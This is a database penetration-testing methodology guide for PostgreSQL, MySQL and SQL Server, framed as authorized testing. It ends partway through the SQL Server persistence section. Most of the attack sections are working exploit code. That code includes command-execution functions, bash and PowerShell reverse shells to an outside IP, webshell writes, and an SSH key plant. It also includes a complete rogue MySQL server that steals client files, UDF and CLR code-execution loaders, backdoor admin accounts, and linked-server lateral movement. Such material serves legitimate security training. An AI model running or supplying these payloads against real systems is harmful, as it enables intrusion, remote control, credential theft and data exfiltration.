# Database Penetration Testing — Complete Methodology for All Major DBMS

---

## Table of Contents

1. [Database Pentest Methodology](#1-database-pentest-methodology)
2. [PostgreSQL Penetration Testing](#2-postgresql-penetration-testing)
3. [MySQL/MariaDB Penetration Testing](#3-mysqlmariadb-penetration-testing)
4. [Microsoft SQL Server Penetration Testing](#4-microsoft-sql-server-penetration-testing)
5. [Oracle Database Penetration Testing](#5-oracle-database-penetration-testing)
6. [NoSQL Database Penetration Testing](#6-nosql-database-penetration-testing)
7. [Cloud Database Security Testing](#7-cloud-database-security-testing)
8. [Database Forensics and Evidence](#8-database-forensics-and-evidence)
9. [Automated Database Testing](#9-automated-database-testing)
10. [Lab: Database Pentest Engagement](#10-lab-database-pentest-engagement)

---

## 1. Database Pentest Methodology

### 1.1 Pre-Engagement Scoping for Database Testing

Database penetration testing differs fundamentally from application-layer testing because a single misconfiguration can expose the entire data tier. Before any test begins, the engagement scope must be negotiated precisely.

**Scope definition checklist:**

- Enumerate every DBMS instance in scope (IP, port, DBMS type, version if known).
- Confirm whether the test is black-box (no credentials), gray-box (low-privilege credentials), or white-box (DBA-level access plus source/schema).
- Determine acceptable risk: is data modification allowed? Can you attempt denial-of-service conditions? Is exfiltration of real data acceptable, or must you use synthetic rows?
- Agree on testing windows — production databases during business hours carry different risk than staging instances.
- Document rollback procedures: who restores a corrupted table, and how fast?
- Clarify legal authorization: a signed Rules of Engagement (RoE) document listing each IP/hostname/port, with explicit language authorizing authentication attacks, injection, and privilege escalation.

**Key deliverables to negotiate before engagement:**

| Item | Details |
|------|---------|
| Network diagram | Database hosts, subnets, firewalls, load balancers |
| Credential set | If gray/white-box: user/pass per DBMS, privilege level |
| Data sensitivity | PII, PHI, PCI-DSS cardholder data, classified |
| Backup verification | Confirm backups exist and have been tested recently |
| Emergency contacts | DBA on-call, CISO, incident response lead |
| Communication plan | Encrypted channel for finding disclosure during testing |

### 1.2 Database Discovery and Enumeration

#### Port Scanning and Service Detection

The first phase is identifying every database listener on the target network.

```bash
# Broad port scan targeting common database ports
nmap -sS -sV -p 1433,1521,3306,5432,6379,9200,27017,9042,5984,8529,26257 \
  -oA db_scan --open 10.10.10.0/24

# Aggressive version detection against discovered hosts
nmap -sV -sC --version-intensity 9 -p 5432 10.10.10.50

# UDP scan for Oracle TNS and MSSQL browser
nmap -sU -p 1434,1521 10.10.10.0/24
```

**Common database ports reference:**

| DBMS | Default Port | Protocol |
|------|-------------|----------|
| PostgreSQL | 5432 | TCP |
| MySQL/MariaDB | 3306 | TCP |
| Microsoft SQL Server | 1433 (TCP), 1434 (UDP browser) | TCP/UDP |
| Oracle | 1521 | TCP |
| MongoDB | 27017 | TCP |
| Redis | 6379 | TCP |
| Elasticsearch | 9200 (HTTP), 9300 (transport) | TCP |
| CouchDB | 5984 | TCP |
| Cassandra | 9042 (CQL), 7199 (JMX) | TCP |
| CockroachDB | 26257 | TCP |

#### Service Fingerprinting

```bash
# PostgreSQL banner grab
echo "" | nc -w3 10.10.10.50 5432 | xxd | head

# MySQL banner grab — MySQL sends a greeting packet immediately on connect
nc -w3 10.10.10.50 3306 | strings

# MSSQL — use the SQL Server Browser service
nmap -sU -p 1434 --script ms-sql-info 10.10.10.50

# Oracle TNS version detection
nmap -sV -p 1521 --script oracle-tns-version 10.10.10.50

# MongoDB — serverStatus without auth
mongosh --host 10.10.10.50 --eval "db.serverStatus()" --quiet 2>/dev/null
```

#### Metasploit Auxiliary Scanners

```bash
# PostgreSQL
use auxiliary/scanner/postgres/postgres_version
set RHOSTS 10.10.10.0/24
run

# MySQL
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 10.10.10.0/24
run

# MSSQL
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 10.10.10.0/24
run

# Oracle TNS SID enumeration
use auxiliary/scanner/oracle/sid_enum
set RHOSTS 10.10.10.50
run
```

### 1.3 Authentication Testing

#### Default Credentials

Every DBMS ships with well-known defaults. Testing these is step one of authentication assessment.

| DBMS | Username | Password | Notes |
|------|----------|----------|-------|
| PostgreSQL | postgres | postgres / empty | Trust auth may allow no password |
| MySQL | root | empty | Pre-5.7 often passwordless root |
| MSSQL | sa | empty / sa | Mixed-mode auth enables sa |
| Oracle | SYS | change_on_install | SYSDBA role |
| Oracle | SYSTEM | manager | |
| Oracle | SCOTT | tiger | Demo schema |
| MongoDB | (none) | (none) | Auth disabled by default pre-4.0 |
| Redis | (none) | (none) | No auth by default |
| Elasticsearch | elastic | changeme | X-Pack security |
| CouchDB | admin | admin | "Admin Party" mode |
| Cassandra | cassandra | cassandra | Default superuser |

#### Brute Force

```bash
# Hydra against PostgreSQL
hydra -l postgres -P /usr/share/wordlists/rockyou.txt \
  10.10.10.50 postgres -t 4 -V

# Hydra against MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  10.10.10.50 mysql -t 4

# Medusa against MSSQL
medusa -h 10.10.10.50 -u sa -P /usr/share/wordlists/rockyou.txt \
  -M mssql -t 4

# Ncrack against PostgreSQL
ncrack -p 5432 --user postgres -P /usr/share/wordlists/rockyou.txt \
  10.10.10.50
```

#### Authentication Bypass Techniques

- **PostgreSQL `pg_hba.conf` trust entries**: If the HBA file is configured with `trust` for a network range, any client in that range authenticates without a password.
- **MySQL `--skip-grant-tables`**: If the server was started with this flag (common in recovery scenarios left active), all authentication is bypassed.
- **MSSQL mixed-mode authentication**: When enabled, the `sa` account is active alongside Windows auth, doubling the attack surface.
- **MongoDB `--noauth`**: Versions before 4.0 defaulted to no authentication.

### 1.4 Authorization Testing

Once authenticated (even with low privileges), test vertical and horizontal privilege boundaries.

#### Privilege Escalation Patterns

1. **Role abuse**: Can a `readonly` user create objects, call administrative functions, or read system catalogs?
2. **GRANT chain**: Can the current user grant themselves higher privileges through transitive GRANT paths?
3. **Stored procedure abuse**: Can the user execute procedures that run with definer (SECURITY DEFINER) privileges?
4. **Cross-database access**: In multi-database instances, can the user access databases outside their scope?
5. **Schema visibility**: Can the user read `information_schema`, `pg_catalog`, `sys` schema objects to enumerate other users and their privileges?

#### Testing Authorization Boundaries

```sql
-- PostgreSQL: Check current privileges
SELECT current_user, session_user;
SELECT * FROM pg_roles WHERE rolname = current_user;
SELECT * FROM information_schema.role_table_grants
  WHERE grantee = current_user;

-- MySQL: Check grants
SHOW GRANTS FOR CURRENT_USER();
SELECT * FROM information_schema.USER_PRIVILEGES;

-- MSSQL: Check effective permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions('dbo', 'SCHEMA');
EXECUTE AS LOGIN = 'sa'; -- test impersonation
```

### 1.5 Data Extraction Methodology

Data extraction during a pentest proves impact. The approach varies by access level:

**Low-privilege extraction:**
- Read accessible tables, views, and materialized views.
- Query `information_schema` to enumerate all tables and columns across schemas.
- Use UNION-based or error-based SQL injection to extract data from tables the application queries.

**Elevated-privilege extraction:**
- Dump entire schemas: `pg_dump`, `mysqldump`, `bcp`, `expdp`.
- Read filesystem files through database file-read primitives.
- Access backup files stored on the database host.

**Exfiltration channels:**
- DNS exfiltration via database DNS lookup functions.
- HTTP exfiltration via `UTL_HTTP` (Oracle), `dblink` (PostgreSQL), `xp_cmdshell curl` (MSSQL).
- Out-of-band via SMB (MSSQL `xp_dirtree` to attacker UNC path).

### 1.6 Post-Exploitation

After gaining access, demonstrate persistence and lateral movement potential:

- **Backdoor accounts**: Create a new database user with elevated privileges.
- **Trigger-based persistence**: Install triggers that re-create backdoor accounts if deleted.
- **Scheduled jobs**: Use database job schedulers (`pg_cron`, MySQL Events, SQL Server Agent, `DBMS_SCHEDULER`) for persistent execution.
- **UDF/extension backdoors**: Load malicious shared libraries that persist across restarts.
- **Credential harvesting**: Extract password hashes from system catalogs for offline cracking.

### 1.7 Reporting Database Vulnerabilities

Database pentest reports must include:

| Section | Content |
|---------|---------|
| Executive Summary | Business risk, data exposure quantified (row counts, table names, data types) |
| Vulnerability Detail | CVSS v3.1 score, CWE identifier, DBMS version affected |
| Proof of Concept | Exact SQL/commands, screenshots, sanitized output |
| Impact Analysis | What data was accessible, what privileges were gained, what could an attacker do next |
| Remediation | Specific configuration changes, patches, query rewrites |
| Risk Rating Matrix | Critical/High/Medium/Low per finding, with prioritization |

---

## 2. PostgreSQL Penetration Testing

### 2.1 Default Configuration Weaknesses

PostgreSQL ships with several default behaviors that create attack surface:

- **`listen_addresses = 'localhost'`**: Secure default, but frequently changed to `'*'` for remote access.
- **`pg_hba.conf` trust authentication**: The `trust` method allows connection without a password. If applied to non-localhost entries, any host in the specified network range gets password-free access.
- **`log_statement = 'none'`**: Query logging is off by default, hampering detection.
- **`ssl = off`**: Connections are unencrypted by default; credentials travel in plaintext.
- **Superuser `postgres`**: The default superuser account exists in every installation.

### 2.2 Authentication Attacks

#### Password Brute Force

```bash
# Using Hydra
hydra -l postgres -P /usr/share/wordlists/rockyou.txt \
  10.10.10.50 postgres -t 8 -V -f

# Using Metasploit
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.10.10.50
set USER_FILE /usr/share/wordlists/common_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run
```

#### pg_hba.conf Misconfiguration Exploitation

```bash
# Check if trust auth is enabled for your network
# If trust auth exists, connect without password:
psql -h 10.10.10.50 -U postgres -d postgres
# No password prompt = trust auth in effect

# Check the pg_hba.conf contents (requires superuser)
SHOW hba_file;
-- Then read it via file I/O (see below)
```

A dangerous `pg_hba.conf` entry:

```
# TYPE  DATABASE  USER  ADDRESS        METHOD
host    all       all   0.0.0.0/0      trust
```

This allows any user from any host to authenticate without a password.

#### Password Hash Extraction

```sql
-- Extract password hashes (requires superuser or pg_read_all_settings)
SELECT rolname, rolpassword FROM pg_authid;

-- PostgreSQL uses MD5 (legacy) or SCRAM-SHA-256 hashing
-- MD5 format: md5 + md5(password + username)
-- SCRAM format: SCRAM-SHA-256$iterations:salt$StoredKey:ServerKey
```

Cracking PostgreSQL MD5 hashes:

```bash
# Format for hashcat: username:md5hash
# Hashcat mode 12 for PostgreSQL
hashcat -m 12 pg_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=postgres pg_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 2.3 SQL Injection Specifics

#### COPY TO/FROM for File I/O

PostgreSQL's `COPY` command allows reading and writing files on the server:

```sql
-- Read /etc/passwd (requires superuser)
CREATE TABLE pwn_read (content TEXT);
COPY pwn_read FROM '/etc/passwd';
SELECT * FROM pwn_read;
DROP TABLE pwn_read;

-- Write a webshell to a writable directory
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Read arbitrary files via COPY ... TO PROGRAM (PostgreSQL 9.3+)
-- CVE-2019-9193: COPY TO/FROM PROGRAM is a feature, not a bug,
-- but it executes OS commands as the postgres OS user
COPY pwn_read FROM PROGRAM 'id';
SELECT * FROM pwn_read;
```

#### Large Object Exploitation

Large objects bypass many file I/O restrictions:

```sql
-- Read a file into a large object
SELECT lo_import('/etc/passwd');
-- Returns OID, e.g., 12345

-- Read the large object content
SELECT convert_from(lo_get(12345), 'UTF-8');

-- Write data to a file via large object
SELECT lo_from_bytea(0, decode('base64_encoded_payload', 'base64'));
SELECT lo_export(12345, '/tmp/payload.sh');

-- Clean up
SELECT lo_unlink(12345);
```

#### PL/pgSQL Code Execution

```sql
-- Execute OS commands via PL/pgSQL (requires plpgsql and superuser)
CREATE OR REPLACE FUNCTION cmd_exec(cmd TEXT)
RETURNS TEXT AS $$
DECLARE
  result TEXT;
BEGIN
  CREATE TEMP TABLE IF NOT EXISTS cmd_output (line TEXT);
  EXECUTE 'COPY cmd_output FROM PROGRAM ' || quote_literal(cmd);
  SELECT string_agg(line, E'\n') INTO result FROM cmd_output;
  DROP TABLE cmd_output;
  RETURN result;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT cmd_exec('id');
SELECT cmd_exec('cat /etc/shadow');
SELECT cmd_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"');
```

#### Python/Perl UDF for Command Execution

```sql
-- If plpythonu or plpython3u is available
CREATE EXTENSION IF NOT EXISTS plpython3u;

CREATE OR REPLACE FUNCTION os_cmd(cmd TEXT)
RETURNS TEXT AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT os_cmd('id');
SELECT os_cmd('cat /etc/shadow');

-- Perl variant
CREATE EXTENSION IF NOT EXISTS plperlu;

CREATE OR REPLACE FUNCTION perl_exec(cmd TEXT)
RETURNS TEXT AS $$
  my $output = `$_[0]`;
  return $output;
$$ LANGUAGE plperlu;

SELECT perl_exec('whoami');
```

### 2.4 Extension Exploitation

#### dblink for SSRF and Port Scanning

```sql
-- Install dblink extension
CREATE EXTENSION IF NOT EXISTS dblink;

-- SSRF: Connect to internal services
SELECT * FROM dblink(
  'host=169.254.169.254 port=80 dbname=fake user=fake password=fake connect_timeout=2',
  'SELECT 1'
) AS t(result TEXT);
-- This will attempt an HTTP-like connection to the AWS metadata service

-- Port scanning internal network
SELECT dblink_connect(
  'host=10.10.10.100 port=22 dbname=fake user=fake password=fake connect_timeout=2'
);
-- Connection success/failure reveals port state

-- Full SSRF via dblink to extract data from another PostgreSQL
SELECT * FROM dblink(
  'host=internal-db.corp port=5432 dbname=secrets user=app password=apppass',
  'SELECT username, password FROM users'
) AS t(username TEXT, password TEXT);
```

#### postgres_fdw for Cross-Server Access

```sql
CREATE EXTENSION IF NOT EXISTS postgres_fdw;

CREATE SERVER target_server
  FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host '10.10.10.100', port '5432', dbname 'production');

CREATE USER MAPPING FOR CURRENT_USER
  SERVER target_server
  OPTIONS (user 'app_user', password 'app_password');

CREATE FOREIGN TABLE remote_users (
  id INT, username TEXT, password_hash TEXT
) SERVER target_server
  OPTIONS (schema_name 'public', table_name 'users');

SELECT * FROM remote_users;
```

### 2.5 Privilege Escalation

```sql
-- Check current role memberships
SELECT r.rolname AS role, m.rolname AS member
FROM pg_auth_members am
JOIN pg_roles r ON r.oid = am.roleid
JOIN pg_roles m ON m.oid = am.member;

-- If you have CREATEROLE privilege, escalate:
ALTER ROLE current_user SUPERUSER;  -- Direct (if CREATEROLE includes SUPERUSER grant)

-- Grant yourself to the postgres superuser group
GRANT pg_execute_server_program TO current_user;  -- Allows COPY PROGRAM
GRANT pg_read_server_files TO current_user;        -- Allows COPY FROM file
GRANT pg_write_server_files TO current_user;       -- Allows COPY TO file

-- SECURITY DEFINER function exploitation
-- If a superuser-owned function has SECURITY DEFINER:
-- Any user who can EXECUTE it runs it as the superuser
SELECT proname, proowner::regrole, prosecdef
FROM pg_proc
WHERE prosecdef = true;
```

### 2.6 CVE History and Exploitation

#### CVE-2019-9193 — COPY TO/FROM PROGRAM

This is classified as a feature by PostgreSQL, not a vulnerability, but it allows any superuser to execute arbitrary OS commands:

```sql
-- Requires superuser
CREATE TABLE cmd_output (output TEXT);
COPY cmd_output FROM PROGRAM 'id; whoami; uname -a';
SELECT * FROM cmd_output;
```

The risk is that many organizations grant superuser to application accounts unnecessarily.

#### CVE-2023-39417 — Extension Script SQL Injection

Affects PostgreSQL extensions using `@extowner@`, `@extschema@`, or `@extschema:...@` replacement markers in extension scripts. An attacker with CREATE privilege in a database can craft objects that inject SQL when the extension is created or updated.

```sql
-- Exploitation requires:
-- 1. CREATE privilege in a database
-- 2. An admin to CREATE/ALTER EXTENSION in that database
-- 3. A vulnerable extension using the replacement markers

-- Attack vector: create a schema with a name containing SQL injection
CREATE SCHEMA "injected'; DROP TABLE important; --";
-- When an admin runs CREATE EXTENSION that uses @extschema@, the
-- injection fires in the admin's security context
```

#### CVE-2023-5868 — Aggregate Function Memory Disclosure

```sql
-- Certain aggregate functions could disclose server memory contents
-- Affects PostgreSQL 16 before 16.1, 15 before 15.5, etc.
-- The fix was to properly initialize memory in aggregate transition functions
```

---

## 3. MySQL/MariaDB Penetration Testing

### 3.1 Authentication Weaknesses

#### Password Plugin Architecture

MySQL supports multiple authentication plugins with different security properties:

| Plugin | Security Level | Notes |
|--------|---------------|-------|
| `mysql_native_password` | Weak | SHA1-based, vulnerable to pass-the-hash |
| `caching_sha2_password` | Strong | Default in MySQL 8.0+, requires SSL or RSA |
| `auth_socket` / `unix_socket` | Local only | Authenticates via OS socket credentials |
| `mysql_old_password` | Very weak | Pre-4.1 hash, trivially crackable |

```bash
# Check authentication plugins in use
mysql -h 10.10.10.50 -u root -p -e \
  "SELECT user, host, plugin FROM mysql.user;"

# mysql_native_password hash format: *SHA1(SHA1(password))
# Cracking with hashcat (mode 300):
hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt

# Old password hash format (mode 200):
hashcat -m 200 old_mysql_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Authentication Bypass via Protocol Manipulation

```bash
# MySQL allows connecting with empty password if account has no password set
mysql -h 10.10.10.50 -u root --password=''

# If --skip-grant-tables is active:
mysql -h 10.10.10.50 -u root
# All privileges granted, no password required
```

### 3.2 UDF Exploitation

User-Defined Functions allow loading shared libraries into MySQL for OS command execution.

```bash
# Step 1: Compile the UDF shared library (or use pre-compiled from sqlmap)
# Located at: /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_

# Step 2: Determine the plugin directory
mysql> SHOW VARIABLES LIKE 'plugin_dir';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
```

```sql
-- Step 3: Upload the shared library to the plugin directory
-- Method 1: Using hex-encoded data
SELECT unhex('7f454c46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exec.so';

-- Method 2: Via INTO DUMPFILE from a table
CREATE TABLE exploit_upload (data LONGBLOB);
INSERT INTO exploit_upload VALUES (LOAD_FILE('/tmp/udf_exec.so'));
SELECT data FROM exploit_upload INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exec.so';

-- Step 4: Create the function
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_exec.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_exec.so';

-- Step 5: Execute commands
SELECT sys_eval('id');
SELECT sys_eval('cat /etc/passwd');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"');

-- Cleanup
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
```

### 3.3 File Operations

#### INTO OUTFILE — Writing Files

```sql
-- Write a webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';

-- Write SSH authorized_keys
SELECT 'ssh-rsa AAAA... attacker@kali' INTO OUTFILE '/root/.ssh/authorized_keys';

-- Check if file write is possible
SHOW VARIABLES LIKE 'secure_file_priv';
-- If NULL: file operations completely disabled
-- If empty string: any path allowed
-- If a path: restricted to that directory only
```

#### LOAD DATA INFILE — Reading Files

```sql
-- Read local files (server-side)
LOAD DATA INFILE '/etc/passwd' INTO TABLE pwn_table
  FIELDS TERMINATED BY '\n';
SELECT * FROM pwn_table;

-- Read files via LOAD DATA LOCAL INFILE (client-side)
-- This reads from the CLIENT machine, not the server
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE pwn_table
  FIELDS TERMINATED BY '\n';
```

### 3.4 Rogue MySQL Server — CLIENT-SIDE File Read

This is a powerful attack: a fake MySQL server that exploits `LOAD DATA LOCAL INFILE` to read arbitrary files from the connecting client.

```python
#!/usr/bin/env python3
"""
Rogue MySQL Server — reads arbitrary files from connecting clients.
Exploits the LOAD DATA LOCAL INFILE protocol feature.
"""

import socket
import struct

TARGET_FILE = "/etc/passwd"

def create_greeting():
    """Create a MySQL server greeting packet."""
    greeting = b'\x0a'                          # Protocol version 10
    greeting += b'5.7.99-rogue\x00'             # Server version
    greeting += struct.pack('<I', 1337)          # Connection ID
    greeting += b'AAAAAAAA\x00'                 # Auth plugin data part 1
    greeting += struct.pack('<H', 0xFFFF)        # Capability flags (lower)
    greeting += b'\x21'                          # Character set (utf8)
    greeting += struct.pack('<H', 0x0002)        # Status flags
    greeting += struct.pack('<H', 0x8000)        # Capability flags (upper)
    greeting += b'\x15'                          # Auth plugin data length
    greeting += b'\x00' * 10                     # Reserved
    greeting += b'BBBBBBBBBBBB\x00'             # Auth plugin data part 2
    greeting += b'mysql_native_password\x00'     # Auth plugin name
    return greeting

def create_ok():
    """Create an OK packet."""
    return b'\x00\x00\x00\x02\x00\x00\x00'

def create_load_data_local(filename):
    """Create a LOCAL INFILE request packet."""
    return b'\xfb' + filename.encode()

def packet_wrap(seq, payload):
    """Wrap a payload in MySQL packet framing."""
    length = struct.pack('<I', len(payload))[:3]
    return length + bytes([seq]) + payload

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 3306))
    server.listen(1)
    print(f"[*] Rogue MySQL server listening, will request: {TARGET_FILE}")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")

        # Send greeting
        client.send(packet_wrap(0, create_greeting()))

        # Receive client auth
        client.recv(4096)

        # Send OK to auth
        client.send(packet_wrap(2, create_ok()))

        # Receive query (COM_QUERY)
        client.recv(4096)

        # Send LOAD DATA LOCAL INFILE request
        client.send(packet_wrap(1, create_load_data_local(TARGET_FILE)))

        # Receive the file contents
        file_data = client.recv(65535)
        if len(file_data) > 4:
            content = file_data[4:]  # Strip packet header
            print(f"[+] File contents of {TARGET_FILE}:")
            print(content.decode('utf-8', errors='replace'))

        # Send final OK
        client.send(packet_wrap(3, create_ok()))
        client.close()

if __name__ == '__main__':
    main()
```

Any MySQL client connecting with `--enable-local-infile` (or libraries defaulting to it) will send the requested file.

### 3.5 information_schema Exploitation

```sql
-- Enumerate all databases
SELECT schema_name FROM information_schema.SCHEMATA;

-- Enumerate all tables in all databases
SELECT table_schema, table_name FROM information_schema.TABLES
  WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys');

-- Enumerate all columns with data types
SELECT table_schema, table_name, column_name, data_type
FROM information_schema.COLUMNS
WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys');

-- Find tables likely containing credentials
SELECT table_schema, table_name FROM information_schema.TABLES
WHERE table_name LIKE '%user%' OR table_name LIKE '%pass%'
   OR table_name LIKE '%cred%' OR table_name LIKE '%auth%'
   OR table_name LIKE '%account%' OR table_name LIKE '%login%';

-- Extract all user privilege information
SELECT * FROM information_schema.USER_PRIVILEGES;
SELECT * FROM information_schema.SCHEMA_PRIVILEGES;
SELECT * FROM information_schema.TABLE_PRIVILEGES;
```

### 3.6 Privilege Escalation Paths

```sql
-- Check if current user has FILE privilege (needed for file I/O)
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.USER_PRIVILEGES
   WHERE GRANTEE = CONCAT("'", CURRENT_USER(), "'")
   AND PRIVILEGE_TYPE = 'FILE') > 0,
  'FILE privilege: YES', 'FILE privilege: NO'
);

-- Check for SUPER privilege
SHOW GRANTS FOR CURRENT_USER();

-- If you have GRANT OPTION, escalate:
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;

-- MySQL 8.0 dynamic privileges to check:
SELECT * FROM information_schema.USER_PRIVILEGES
WHERE PRIVILEGE_TYPE IN (
  'SUPER','SYSTEM_VARIABLES_ADMIN','FILE',
  'PROCESS','RELOAD','SHUTDOWN'
);
```

### 3.7 Replication Exploitation

```sql
-- Check if binary logging is enabled
SHOW VARIABLES LIKE 'log_bin';
SHOW MASTER STATUS;
SHOW SLAVE STATUS\G

-- If you can configure replication, point the target at a rogue master
-- to inject arbitrary SQL statements via the replication stream
CHANGE MASTER TO
  MASTER_HOST='attacker-ip',
  MASTER_USER='repl_user',
  MASTER_PASSWORD='repl_pass',
  MASTER_PORT=3306;
START SLAVE;
```

---

## 4. Microsoft SQL Server Penetration Testing

### 4.1 xp_cmdshell — OS Command Execution

`xp_cmdshell` is the most well-known MSSQL attack vector. It is disabled by default since SQL Server 2005 but can be re-enabled by a sysadmin.

```sql
-- Check if xp_cmdshell is enabled
SELECT name, value_in_use
FROM sys.configurations
WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'net user hacker P@ssw0rd123! /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Reverse shell via PowerShell
EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.5'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

-- Data exfiltration via xp_cmdshell
EXEC xp_cmdshell 'bcp "SELECT * FROM master.sys.server_principals" queryout "C:\temp\users.txt" -c -T';
```

### 4.2 OLE Automation for Command Execution

When `xp_cmdshell` is disabled or monitored, OLE Automation procedures provide an alternative:

```sql
-- Enable OLE Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute commands via WScript.Shell
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt';
EXEC sp_OADestroy @shell;

-- Read the output
CREATE TABLE #output (line VARCHAR(8000));
BULK INSERT #output FROM 'C:\temp\output.txt';
SELECT * FROM #output;
DROP TABLE #output;

-- Alternative: Use Shell.Application for file system access
DECLARE @fso INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
DECLARE @file INT;
EXEC sp_OAMethod @fso, 'OpenTextFile', @file OUTPUT, 'C:\Windows\win.ini', 1;
DECLARE @content VARCHAR(8000);
EXEC sp_OAMethod @file, 'ReadAll', @content OUTPUT;
SELECT @content;
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @fso;
```

### 4.3 CLR Assembly Exploitation

Custom .NET assemblies can be loaded into SQL Server for arbitrary code execution:

```csharp
// Step 1: Compile the malicious assembly
// Save as CmdExec.cs
using System;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using Microsoft.SqlServer.Server;

public class StoredProcedures
{
    [SqlProcedure]
    public static void CmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = string.Format("/c {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(
            new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);

        while (!proc.StandardOutput.EndOfStream)
        {
            record.SetString(0, proc.StandardOutput.ReadLine());
            SqlContext.Pipe.SendResultsRow(record);
        }

        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
}
```

```bash
# Compile the assembly
csc /target:library /out:CmdExec.dll CmdExec.cs
```

```sql
-- Step 2: Enable CLR and load the assembly
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Set TRUSTWORTHY on the database
ALTER DATABASE [master] SET TRUSTWORTHY ON;

-- Load the assembly from file or hex
CREATE ASSEMBLY CmdExec
FROM 'C:\temp\CmdExec.dll'
WITH PERMISSION_SET = UNSAFE;

-- Alternative: load from hex (no file system access needed)
CREATE ASSEMBLY CmdExec
FROM 0x4D5A900003000000... -- hex-encoded DLL bytes
WITH PERMISSION_SET = UNSAFE;

-- Create the stored procedure
CREATE PROCEDURE [dbo].[CmdExec] @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [CmdExec].[StoredProcedures].[CmdExec];

-- Execute
EXEC CmdExec 'whoami';
EXEC CmdExec 'net user';
```

### 4.4 Linked Server Exploitation

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;

-- Execute queries on linked servers (lateral movement)
SELECT * FROM OPENQUERY([LINKED-SERVER], 'SELECT @@servername; SELECT @@version');
SELECT * FROM OPENQUERY([LINKED-SERVER], 'SELECT * FROM master.sys.server_principals');

-- Execute xp_cmdshell on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SERVER];

-- Enable xp_cmdshell on linked server
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED-SERVER];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED-SERVER];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED-SERVER];

-- Double-hop: linked server → another linked server
SELECT * FROM OPENQUERY([SERVER-A],
  'SELECT * FROM OPENQUERY([SERVER-B], ''SELECT @@servername'')');

-- RPC out (alternative to OPENQUERY)
EXEC [LINKED-SERVER].master.dbo.sp_executesql N'SELECT @@servername';
```

### 4.5 SQL Server Agent for Persistence

```sql
-- Create a persistent job that runs every minute
USE msdb;
EXEC sp_add_job @job_name = N'MaintenanceTask';

